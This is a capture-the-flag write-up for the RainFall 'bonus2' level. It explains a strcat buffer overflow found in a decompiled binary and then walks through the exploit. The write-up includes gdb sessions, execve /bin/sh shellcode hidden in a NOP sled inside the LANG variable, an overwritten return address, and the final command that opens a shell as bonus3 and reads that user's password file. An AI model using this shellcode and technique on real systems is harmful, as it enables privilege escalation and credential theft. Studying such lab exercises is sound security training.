# Bonus2

## Analysis

You can find the decompiled executable [here](./bonus2_decomp.c).

When taking a look at it, we can see that it takes 2 arguments; first it copies at most 40 bytes of our first argument to a buffer of size 72 named `dest`.
After that, it copies at most 32 bytes of the second argument after the first 40 bytes of `dest`.
So the maximum number of characters we can copy is 72.

Following these copies, it will get the value of one of our env variable, LANG, and compare its first two bytes to check if it contains either "fi" or "nl". In the first case, language will be set to 1, in the second case, it will be set to 2. If neither of these cases is true, then language = 0.

After that, `greetuser()` is called, this function has a 64 bytes buffer that we will call `u_buff`. It will, according to the language set, either copy:

- "Hello " if no lang is set
- "Goedemiddag! " if the lang is set to "nl"
- "Hyvää päivää " if the lang is set to "fi"

into our u_buff. After that, it will also `strcat()` our main's `dest` buffer into `u_buff` which will cause a segfault in most cases.

What's important is that our first argument must be of size 40, else, the strcat call in `greetuser()` will encounter a null byte and not read the second part of `dest`.

## Exploit

If we let LANG at its default value, we cannot find our offset when the crash occurs ("Hello " is not long enough to get to the EIP address), which is why we set LANG to "nl" during our exploit.

To find the desired offset, we used the following process:

```bash
(gdb) R $(python -c 'print "A" * 40') 1111222233334444555566667777888899990000       
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 40') 1111222233334444555566667777888899990000
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11112222333344445555666677778888

Program received signal SIGSEGV, Segmentation fault.
0x37373736 in ?? ()
(gdb)
```

In this case using "nl" our offset is 23 (`0x37373736 = 6777`).

This is where we will store the address of our shellcode, speaking of it, we need to store it somewhere and the LANG env variable is the perfect candidate:

```bash
export LANG=$(python -c 'print("nl" + 100 * "\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

After storing our shellcode, we need to get its address, we did this using GDB as follows:

```bash
(gdb) b *main+135
Breakpoint 1 at 0x80485b0
(gdb) r asd asd
Starting program: /home/user/bonus2/bonus2 asd asd

Program received signal SIGSEGV, Segmentation fault.
0x080485ab in main ()
(gdb) x/20s *((char **)environ)
0xbffffdb3:	"SHELL=/bin/bash"
0xbffffdc3:	"TERM=xterm-kitty"
0xbffffdd4:	"SSH_CLIENT=192.168.1.82 47980 4242"
0xbffffdf7:	"SSH_TTY=/dev/pts/0"
0xbffffe0a:	"USER=bonus2"
0xbffffe16:	"LS_COLORS="
0xbffffe21:	"COLUMNS=213"
0xbffffe2d:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffe7a:	"MAIL=/var/mail/bonus2"
0xbffffe90:	"_=/usr/bin/gdb"
0xbffffe9f:	"PWD=/home/user/bonus2"
0xbffffeb5:	"LANG=nl\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
0xbfffff36:	"LINES=50"
0xbfffff3f:	"HOME=/home/user/bonus2"
0xbfffff56:	"SHLVL=1"
0xbfffff5e:	"LOGNAME=bonus2"
0xbfffff6d:	"SSH_CONNECTION=192.168.1.82 47980 192.168.1.97 4242"
0xbfffffa1:	"LESSOPEN=| /usr/bin/lesspipe %s"
0xbfffffc1:	"LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbfffffe3:	"/home/user/bonus2/bonus2"
```

We take the address of LANG and add 50 to it so that we land in the middle of the nopslide:

```bash
(gdb) x/x 0xbffffeb5 + 50
0xbffffee7:	0x90
```

We will use this address: `0xbffffee7` as our jump destination.

### /!\ BE CAREFUL /!\

As we can see here:

```c
if ( argc != 3 )
  return 1;
```

The program expects 3 arguments to work, however, if the address you pass as the second arguments starts with "20", or any other whitespace ascci value, it will print and the following part of the address will count as another argument making the program return early.

Example:

```bash
  first arg |         second arg            |               third arg            | fourth arg |
./bonus2      $(python -c 'print "A" * 40')   $(python -c 'print "B" * 23 + "\x20\xff\xff\xbf"')
                                                                               ↳ Counts as a whitespace, splitting the argument
```

#

## The payload

<spoiler>
  <summary>spoiler</summary>

Our payload will be composed of the following:

```bash
   1st arg                2nd arg
([40 filler]), ([23 filler] + [payload addr])
```

```bash
$(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe7\xfe\xff\xbf"')
```

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe7\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
$ whoami 
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 
```

</spoiler>

